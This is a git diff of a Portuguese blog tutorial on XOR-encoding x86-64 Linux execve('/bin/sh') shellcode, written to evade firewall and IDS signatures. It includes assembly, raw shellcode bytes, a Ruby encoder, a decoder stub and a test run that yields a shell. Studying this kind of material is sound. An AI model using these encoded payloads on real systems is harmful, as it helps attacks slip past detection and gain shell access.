@@ -32,13 +32,13 @@
       <h2></h2>
       <p>Fala galerinha do bem!<br>
       Agora que já temos uma noção melhor de como fazer shellcodes com nossas próprias mãos sem frameworks como msfvenom, que por sinal é bem bacana. Só que foge da nossa ideia de saber como as coisas funcionam por baixo, Low Level.</p>
-      <p>Hoje vamos dar continuidade a esses shellcodes, mas, só que agora vai ser em  uma maneira simples de obfuscar eles, a cripto que vamos usar é bem simples, entretanto é um bom  início, será a XOR já vimos um pouco dela em nosso <a href="../bla.html" target="_blank">Writeup sobre o Easy ELF do Reversing.kr</a>(Breve tem mais writeups). Só que  dessa vez vamos ver os detalhes de como ele funciona já que eu mostrei pouco no artigo anterior e indiquei uns links para ajudar. No entanto vamos ver como funciona usando duas linguagens bem distintas para construir nossos encoders, que são Assembly(Pra deixar o artigo mais interessante) e um código em ruby, pois ruby é elegante! </p>
+      <p>Hoje vamos dar continuidade a esses shellcodes, mas, só que agora vai ser em  uma maneira simples de obfuscar eles, a cripto que vamos usar é bem simples, entretanto é um bom  início, será a XOR já vimos um pouco dela em nosso <a href="../bla.html" target="_blank">Writeup sobre o Easy ELF do Reversing.kr</a>(Breve tem mais writeups). Só que  dessa vez vamos ver os detalhes de como ele funciona já que eu mostrei pouco no artigo anterior e indiquei uns links para ajudar. No entanto vamos ver como funciona usando um código em ruby, pois ruby é elegante! </p>
 
       <h2>Por quê ofusca-los?</h2>
       <p>Pra que eles não sejam detecados pelos Firewalls e IDS que tentam pegar nossos meninos por assinatura. Então temos que usar um encoder para dificultar a situação deles(Não que nosso XOR encoder ajude muito), mas vai nos ajudar a enteder como funcionam que é o ideal do artigo.</p>
 
       <h2> Xor(Ou Exclusivo) </h2>
-      <p>Xor é uma porta lógica assim como OR(ou), AND(&) como as que usamos nas operações booleanas. Nada melhor que uma tabela verdade para ficar mais claro</p>
+      <p>Xor é uma porta lógica assim como OR(ou), AND(&)... Essa operação envolvendo dois operandos resultará em valor lógico verdadeiro se apenas um dos dois forem verdadeiros diferente de do ou comum que quando ambos são verdadeiros a resposta também é verdadeira. Nada melhor que uma tabela verdade para ficar mais claro</p>
       <pre><center>
 ----------------------------
 | Entradas       | Saídai  |
@@ -53,36 +53,190 @@
       <p>Massa, então vamos ver o que acontece quando usamos XOR em cada caractere da palavra 'n3k00n3' usando a palavra 'hacking' como senha.</p>
 
       <pre><center>
----------------------------------------------------
-|       hacking ^ n3k00n3     |        Saída      |
----------------------------------------------------
-| h ^ n | 10000001 ^ 00000000 | 0x00 = 01010101   |
-| a ^ 3 |                     |                   |
-| c ^ k |                     |                   |
-| k ^ 0 |                     |                   |
-| i ^ 0 |                     |                   |
-| n ^ n |                     |                   |
-| g ^ 3 |                     |                   |
----------------------------------------------------
+------------------------------------------------------
+|       hacking ^ n3k00n3       |        Saída       |
+------------------------------------------------------
+| h ^ n | 0110 1000 ^ 0110 1110 |  0x06 = 0000 0110  |
+| a ^ 3 | 0110 0001 ^ 0011 0011 |  0x52 = 0101 0010  |
+| c ^ k | 0110 0011 ^ 0110 1011 |  0x08 = 0000 1000  |
+| k ^ 0 | 0110 1011 ^ 0011 0000 |  0x5b = 0101 1011  |
+| i ^ 0 | 0110 1001 ^ 0011 0000 |  0x59 = 0101 1001  |
+| n ^ n | 0110 1110 ^ 0110 1110 |  0x00 = 0000 0000  |
+| g ^ 3 | 0110 0111 ^ 0011 0011 |  0x54 = 0101 0100  |
+------------------------------------------------------
       </center></pre>
 
+<p>Como podemos ver é simples, para decodar é tão simples quanto encriptar. <br>Por exemplo: <strong>h</strong> XOR <strong>n</strong> ficou igual <strong>0x06</strong> que é está fora do range de caracteres imprimíveis. Para decodar ele para h novamente é só pegarmos ele e fazer XOR n.
+<pre><blockquote>
+      0x06 = 0000 0110 = ACK (acknowledge)
+      0x6e = 0110 1110 = n
+XOR  ----------------------
+      0x68 = 0110 1000 = h
+</blockquote></pre>
+
+<h2>Shellcode</h2>
+<p>Já temos nosso shellcode - execve(/bin//sh) do artigo anterior mas usamos a técnica STACK BASED e vamos mudar agora para JMP-CALL_POP
+  <code><pre><blockquote>
+    ;---------------------------------------------------
+    ; EXECVE "/bin/sh" Using JMP-CALL-POP Technique
+    ;       Execve doesn't return if succesful
+    ;        There's no need for exit syscall
+    ;---------------------------------------------------
+
+    global _start
+    section .text
+
+    _start:
+        jmp address
+
+    shellcode:
+        xor rax, rax
+
+        pop rdi
+
+        mov [rdi+7], byte ah
+        mov [rdi+8], rdi
+        mov [rdi+16], rax
+
+        lea rsi,[rdi+8]
+        lea rdx, [rdi+16]
+
+        add rax, 59
+        syscall
+
+    address:
+        call shellcode
+        shellcode_string: db "/bin/shABBBBBBBBCCCCCC"
+  </blockquote></pre></code>
+
+  <p> Já sabemos como compilar e pegar o shellcode </p>
+
+  <pre><blockquote>
+[n3k00n3@labs shellcodes]$ nasm -felf64 asm_nbf_execve_sh_linux64_2.asm  -o shellcode.o
+[n3k00n3@labs shellcodes]$ !cat
+cat cmd_shellcode_extractor | sh
+\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48
+\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41
+\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43
+  </blockquote></pre>
+
+<p> Great! Agora só precisamos fazer o que queriamos fazer desde o início do artigo. Encodar nosso shellcode. vamos fazer em ruby<br>
+Link para o código fonte: <a href="https://github.com/n3k00n3/shellcodes/blob/master/XorEncoder.rb" target="_blank">XorEncoderShellcodes.rb</a> <br>
+<strong>Nota:</strong> Fique a vontade para melhora-lo ou escrever na linguagem que tu gosta mais.</p>
+<code><pre><blockquote>
+  #!/usr/bin/ruby
+  #Ruby XOR Encoder Shellcodes
+
+  #Seu código aqui.
+  shellcode="\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48
+  \x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69
+  \x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43"
+
+  puts "\e[1m\e[32mEncoding Shellcode...\e[0m\n\n"
+
+  encoded = String.new
+  encoded2 = String.new
+
+  shellcode.each_byte do |byte|
+      xor = byte^0xAA
+      encoded << '\\x'
+      encoded << xor.to_s(16)
+
+      encoded2 << '0x'
+      encoded2 << xor.to_s(16)
+      encoded2 << ','
+
+  end
+
+
+  puts "\e[1m\e[32m[ Type \\x01... ]\e[0m"
+  puts encoded
+  puts ""
+  puts "\e[1m\e[32m[ Type 0x02... ]\e[0m"
+  puts encoded2
+</blockquote></pre></code>
+
+<p>Salvou! Rodou!</p>
+<code><pre><blockquote>
+  Encoding Shellcode...
+
+  [ Type \x01... ]
+  \x41\xb7\xe2\x9b\x6a\xf5\x22\xcd\xad\xe2\x23\xd5\xa2\xe2\x23\xed\xba\xe2\x27\xdd\xa2\xe2\x27\xfd\xba\xe2\x29\x6a
+  \x91\xa5\xaf\x42\x74\x55\x55\x55\x85\xc8\xc3\xc4\x85\xd9\xc2\xeb\xe8\xe8\xe8\xe8\xe8\xe8\xe8\xe8\xe9\xe9\xe9\xe9
+  \xe9\xe9\xe9\xe9
+
+  [ Type 0x02... ]
+  0x41,0xb7,0xe2,0x9b,0x6a,0xf5,0x22,0xcd,0xad,0xe2,0x23,0xd5,0xa2,0xe2,0x23,0xed,0xba,0xe2,0x27,0xdd,0xa2,0xe2,
+  0x27,0xfd,0xba,0xe2,0x29,0x6a,0x91,0xa5,0xaf,0x42,0x74,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xd9,0xc2,0xeb,
+  0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,
+
+</blockquote></pre></code>
+
+<p>Great!! Agora temos nosso shellcode encodado, vamos agora criar um novo shellcode que decoda e roda ele, para assim ganharmos nossa querida shell.</p>
+
+<code><pre><blockquote>
+;--------------------------------------------------------
+;              .:: Xor decoder Shellcodes ::.
+;        This Shellcode has our shellcode encoded
+; So before anything,he needs to decode our shellcode
+;                 JMP-CALL-POP Technique
+;--------------------------------------------------------
 
 
 
+global _start
+section .text
 
+_start:
+    jmp address
 
+decoder:
+    pop rdi
+    xor rcx, rcx
+    add cl, 58
+    .decode:
+        xor byte [rdi], 0xAA
+        inc rdi
+        loop .decode
 
+        ;Our shellcode decoded
+        jmp encodedShellcode
 
+address:
+    call decoder
+    encodedShellcode: db 0x41,0xb7,0xe2,0x9b,0x6a,0xf5,0x22,0xcd,0xad,0xe2,0x23,0xd5,
+    0xa2,0xe2,0x23,0xed,0xba,0xe2,0x27,0xdd,0xa2,0xe2,0x27,0xfd,0xba,0xe2,0x29,0x6a,
+    0x91,0xa5,0xaf,0x42,0x74,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xd9,0xc2,0xeb,
+    0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9
+  </blockquote></pre></code>
 
+<p> Massa hein? Agora vamos compilar e rodar para ver se ele nos dar mesmo um shellcode :D</p>
+<code><pre><blockquote>
+[n3k00n3@labs shellcodes]$ nasm -felf64 asm_nbf_xor_encoded_linux64.asm -o shellcode.o
+[n3k00n3@labs shellcodes]$ !cat
+cat cmd_shellcode_extractor | sh
+\xeb\x11\x5f\x48\x31\xc9\x80\xc1\x3a\x80\x37\xaa\x48\xff\xc7\xe2\xf8\xeb\x05\xe8\xea\xff
+\xff\xff\x41\xb7\xe2\x9b\x6a\xf5\x22\xcd\xad\xe2\x23\xd5\xa2\xe2\x23\xed\xba\xe2\x27\xdd
+\xa2\xe2\x27\xfd\xba\xe2\x29\x6a\x91\xa5\xaf\x42\x74\x55\x55\x55\x85\xc8\xc3\xc4\x85\xd9
+\xc2\xeb\xe8\xe8\xe8\xe8\xe8\xe8\xe8\xe8\xe9\xe9\xe9\xe9\xe9\xe9\xe9\xe9
+  </blockquote></pre></code>
+<p>Agora vamos roda em nosso arquivo de teste </p>
+  <code><pre><blockquote>
+[n3k00n3@labs shellcodes]$ !gcc
+    gcc -fno-stack-protector -z execstack testing.c -o testing
+[n3k00n3@labs shellcodes]$ ./testing
+    Shellcode Length:  84
+    sh-4.3$
 
+    </blockquote></pre></code>
 
+<p>Tchanran!!! Massa demais né? Eu também fico feliz quando as coisas acontecem. Agora só evoluir 1% por dia, todos os dias!</p>
 
-     <br><br> 
+     <br><br>
       <hr>
       <p>Referências:</p>
       <ul>
-        <li><a href="" target="_blank"></a></li>
-        <li><a href="" target="_blank"></a></li>
+        <li><a href="https://en.wikipedia.org/wiki/XOR_cipher" target="_blank">XOR Cipher</a></li>
       </ul>
 
       <br>
